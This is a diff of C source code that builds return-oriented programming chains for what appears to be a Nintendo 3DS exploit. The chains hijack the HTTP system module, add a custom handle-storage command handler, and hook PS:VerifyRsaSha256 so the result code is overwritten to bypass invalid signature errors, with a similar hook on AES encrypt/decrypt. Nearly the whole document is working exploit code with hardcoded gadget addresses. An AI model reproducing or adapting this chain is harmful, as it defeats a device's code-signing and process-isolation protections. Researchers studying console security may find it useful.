@@ -67,6 +67,8 @@ u32 ROP_svcControlMemory = 0x00100770;
 
 u32 ROP_svc32 = 0x00100cbc;//"ldr r0, [r0]" "svc 0x00000032" <check if r0 is positive via r1, then r0=cmdreply resultcode if so> "pop {r4, pc}"
 
+u32 ROP_CloseHandle = 0x00104698;//"push {r4, lr}" r4=r0. if((handle = *r0)){<svcCloseHandle with handle>; *r4 = 0;} return r4 + pop {r4, pc}
+
 u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
 u32 ROP_HTTPC_CMDHANDLER_CreateContext = 0x00114b4c;//This is the start of the code in the httpc_cmdhandler which handles the CreateContext cmd, starting with "ldr r7, =<cmdhdr>".
 u32 ROP_HTTPC_CMDHANDLER_AddRequestHeader = 0x00114f40;//Same as ROP_HTTPC_CMDHANDLER_CreateContext except for AddRequestHeader.
@@ -384,6 +386,14 @@ void ropgen_svcSendSyncRequest(u32 **ropchain, u32 *http_ropvaddr, u32 handle_ad
 
 	ropgen_setr0(ropchain, http_ropvaddr, handle_addr);
 	ropgen_addword(ropchain, http_ropvaddr, ROP_svc32);
+	ropgen_addword(ropchain, http_ropvaddr, 0);//r4
+}
+
+void ropgen_CloseHandle(u32 **ropchain, u32 *http_ropvaddr, u32 handle_addr, u32 set_addr)
+{
+	if(set_addr)ropgen_setr0(ropchain, http_ropvaddr, handle_addr);
+	
+	ropgen_addword(ropchain, http_ropvaddr, ROP_CloseHandle+4);
 	ropgen_addword(ropchain, http_ropvaddr, 0);//r4
 }
 
@@ -869,6 +879,9 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 *ropchain1, ropvaddr1;
 	u32 *ropchain2, ropvaddr2;
 	u32 *ropchain3, ropvaddr3;
+	u32 *ropchain4, ropvaddr4;
+	u32 *ropchain5, ropvaddr5;
+	u32 *ropchain6, ropvaddr6;
 
 	u32 *ropchain_block0, ropvaddr_block0;
 	u32 *ropchain_block1, ropvaddr_block1;
@@ -901,7 +914,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 curent = ropheap+0x3c;
 	u32 ropentry_type = ropheap+0x44;
 	u32 customcmdhandler_handlestorage = ropheap+0x70;
-	u32 cmdreq_storage = ropheap+0x74;
+	u32 cmdreq_storage = ropheap+0x80;
 
 	u32 customcmdhandler_roplaunch_savedregs_addr=0;
 
@@ -1300,10 +1313,25 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_writeu32(&ropchain, &ropvaddr, 0xd900182f, 0, 0);
 
 	/*
-	if(cmdhdr==0x00000002)
+	if(cmdhdr==0x18010082)
 	{
-		customcmdhandler_handlestorage = cmdreq[2];
-		retval = 0;
+		if(cmdreq[2]!=0x0 && cmdreq[2]!=0x1 && cmdreq[2]!=0x2 && cmdreq[2]!=0x3)//If this wasn't checked the user process could just read/write a handle/whatever anywhere in HTTP-sysmodule memory.
+		{
+			retval = 0xffffffff;
+		}
+		else
+		{
+			handleptr = &customcmdhandler_handlestorage[cmdreq[2]];
+			if(cmdreq[1]==0)*handleptr = cmdreq[4];
+			if(cmdreq[1]==1)
+			{
+				cmdreply[3] = *handleptr;
+				cmdreply[0] = 0x18010042;
+				cmdreply[2] = 0x0;
+			}
+			if(cmdreq[1]==2)CloseHandle(handleptr);
+			retval = 0;
+		}
 	}
 	else
 	{
@@ -1313,18 +1341,113 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	*/
 
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
-	ropgen_popr1(&ropchain, &ropvaddr, 0x00000002);
+	ropgen_popr1(&ropchain, &ropvaddr, 0x18010082);
 	ropchain3 = ropchain;
 	ropvaddr3 = ropvaddr;
 	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
 
 		//Translate header isn't validated here, but whatever.
 
-		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
-		ropgen_add_r0ip(&ropchain, &ropvaddr, 0x8);
-		ropgen_movr1r0(&ropchain, &ropvaddr);
-		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
-		ropgen_strr0r1(&ropchain, &ropvaddr, customcmdhandler_handlestorage, 1);
+		//if(cmdreq[2]!=0x0 && cmdreq[2]!=0x1 && cmdreq[2]!=0x2 && cmdreq[2]!=0x3)<set retval to 0xffffffff and jump over the rest of this ROP>
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x8, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0x0);
+		ropchain0 = ropchain;
+		ropvaddr0 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x8, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0x1);
+		ropchain1 = ropchain;
+		ropvaddr1 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x8, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0x2);
+		ropchain4 = ropchain;
+		ropvaddr4 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x8, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0x3);
+		ropchain5 = ropchain;
+		ropvaddr5 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_setr0(&ropchain, &ropvaddr, 0xffffffff);
+		ropchain6 = ropchain;
+		ropvaddr6 = ropvaddr;
+		ropgen_stackpivot(&ropchain, &ropvaddr, 0);
+
+		ropgen_checkcond_necontinue_eqjump(&ropchain0, &ropvaddr0, ropvaddr);
+		ropgen_checkcond_necontinue_eqjump(&ropchain1, &ropvaddr1, ropvaddr);
+		ropgen_checkcond_necontinue_eqjump(&ropchain4, &ropvaddr4, ropvaddr);
+		ropgen_checkcond_necontinue_eqjump(&ropchain5, &ropvaddr5, ropvaddr);
+
+		//Overwrite the dst addr used for writing the actual handle below with: cmdreq[2]*4 + customcmdhandler_handlestorage
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x8, 1);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x20 + 0x24, 1);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x28 + 0x24, 1);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x28 + 0x28 + 0x24, 1);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, customcmdhandler_handlestorage);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0xc0, 1);
+
+		//if(cmdreq[1]==0)*<handlestorageptr> = cmdreq[4];
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x4, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0x0);
+		ropchain0 = ropchain;
+		ropvaddr0 = ropvaddr;
+		ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+			ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0xc0, ropvaddr + 0x40 + 0x20 + 0x4, 0x3);
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x10, 1);
+			ropgen_strr0r1(&ropchain, &ropvaddr, 0, 1);
+
+		ropgen_checkcond_eqcontinue_nejump(&ropchain0, &ropvaddr0, ropvaddr);
+
+		//if(cmdreq[1]==1)cmdreply[3] = *<handlestorageptr>;
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x4, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0x1);
+		ropchain0 = ropchain;
+		ropvaddr0 = ropvaddr;
+		ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
+			ropgen_add_r0ip(&ropchain, &ropvaddr, 0x8);
+			ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40 + 0x20 + 0x4, 1);
+
+			ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0xc0, ropvaddr + 0x40 + 0x4, 0x3);
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 1);
+			ropgen_strr0r1(&ropchain, &ropvaddr, 0, 1);
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x18010042;
+			ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
+			ropgen_movr1r0(&ropchain, &ropvaddr);
+			ropgen_writeu32(&ropchain, &ropvaddr, 0x18010042, 0, 0);
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[2] = 0x0;
+			ropgen_add_r0ip(&ropchain, &ropvaddr, 0x4);
+			ropgen_movr1r0(&ropchain, &ropvaddr);
+			ropgen_writeu32(&ropchain, &ropvaddr, 0x0, 0, 0);
+
+		ropgen_checkcond_eqcontinue_nejump(&ropchain0, &ropvaddr0, ropvaddr);
+
+		//if(cmdreq[1]==2)CloseHandle(handleptr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x4, 1);
+		ropgen_popr1(&ropchain, &ropvaddr, 0x2);
+		ropchain0 = ropchain;
+		ropvaddr0 = ropvaddr;
+		ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+			ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0xc0, 1);
+
+			ropgen_CloseHandle(&ropchain, &ropvaddr, 0, 0);
+
+		ropgen_checkcond_eqcontinue_nejump(&ropchain0, &ropvaddr0, ropvaddr);
 
 		ropgen_setr0(&ropchain, &ropvaddr, 0);
 		ropchain2 = ropchain;
@@ -1337,6 +1460,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	//Write r0 to cmdreply[1].
 	ropgen_stackpivot(&ropchain2, &ropvaddr2, ropvaddr);
+	ropgen_stackpivot(&ropchain6, &ropvaddr6, ropvaddr);
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x2c + 0x4, 1);
 
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
@@ -1345,29 +1469,10 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
 
 	/*
-	if(cmdhdr==0x00040204)//PS:EncryptDecryptAes
-	{
-		memcpy(&cmdreply[6], &saved_cmdreq[9], 0x10);//Copy the translate descriptors + bufaddrs to the cmdreply.
-	}
-	*/
-	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
-	ropgen_popr1(&ropchain, &ropvaddr, 0x000401C4);
-	ropchain3 = ropchain;
-	ropvaddr3 = ropvaddr;
-	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
-
-	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Write the address of cmdbuf[6] to the below dst-ptr used with memcpy.
-	ropgen_add_r0ip(&ropchain, &ropvaddr, 6<<2);
-	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40, 1);
-
-	ropgen_memcpy(&ropchain, &ropvaddr, 0, cmdreq_storage+(9<<2), 0x10);
-
-	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
-
-	/*
 	if(cmdhdr==0x00020244)//PS:VerifyRsaSha256
 	{
 		memcpy(&cmdreply[2], &saved_cmdreq[12], 0x8);//Copy the translate descriptors + bufaddrs to the cmdreply.
+		cmdreply[0] = 0x00020042;//Write the cmdhdr just in case svcSendSyncRequest itself failed.
 		cmdreply[1] = 0x1;//Overwrite the resultcode to bypass invalid signature errors. 0x1 is for testing.
 	}
 	*/
@@ -1377,20 +1482,51 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropvaddr3 = ropvaddr;
 	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
 
-	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Write the address of cmdbuf[2] to the below dst-ptr used with memcpy.
-	ropgen_add_r0ip(&ropchain, &ropvaddr, 2<<2);
-	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40, 1);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Write the address of cmdbuf[2] to the below dst-ptr used with memcpy.
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 2<<2);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40, 1);
 
-	ropgen_memcpy(&ropchain, &ropvaddr, 0, cmdreq_storage+(12<<2), 0x8);
+		ropgen_memcpy(&ropchain, &ropvaddr, 0, cmdreq_storage+(12<<2), 0x8);
 
-	//cmdreply[1] = 0x1
-	ropgen_setr0(&ropchain, &ropvaddr, 0);
-	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x2c + 0x4, 1);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x00020042;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_writeu32(&ropchain, &ropvaddr, 0x00020042, 0, 0);
 
-	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
-	ropgen_movr1r0(&ropchain, &ropvaddr);
-	ropgen_setr0(&ropchain, &ropvaddr, 0);
-	ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
+		//cmdreply[1] = 0x1
+		ropgen_setr0(&ropchain, &ropvaddr, 0);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x2c + 0x4, 1);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_setr0(&ropchain, &ropvaddr, 0);
+		ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
+
+	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
+
+	/*
+	if(cmdhdr==0x00040204)//PS:EncryptDecryptAes
+	{
+		cmdreply[0] = 0x00040144;//Write the cmdhdr just in case svcSendSyncRequest itself failed.
+		memcpy(&cmdreply[6], &saved_cmdreq[9], 0x10);//Copy the translate descriptors + bufaddrs to the cmdreply.
+	}
+	*/
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
+	ropgen_popr1(&ropchain, &ropvaddr, 0x000401C4);
+	ropchain3 = ropchain;
+	ropvaddr3 = ropvaddr;
+	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x00040144;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_writeu32(&ropchain, &ropvaddr, 0x00040144, 0, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Write the address of cmdbuf[6] to the below dst-ptr used with memcpy.
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 6<<2);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40, 1);
+
+		ropgen_memcpy(&ropchain, &ropvaddr, 0, cmdreq_storage+(9<<2), 0x10);
 
 	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
 
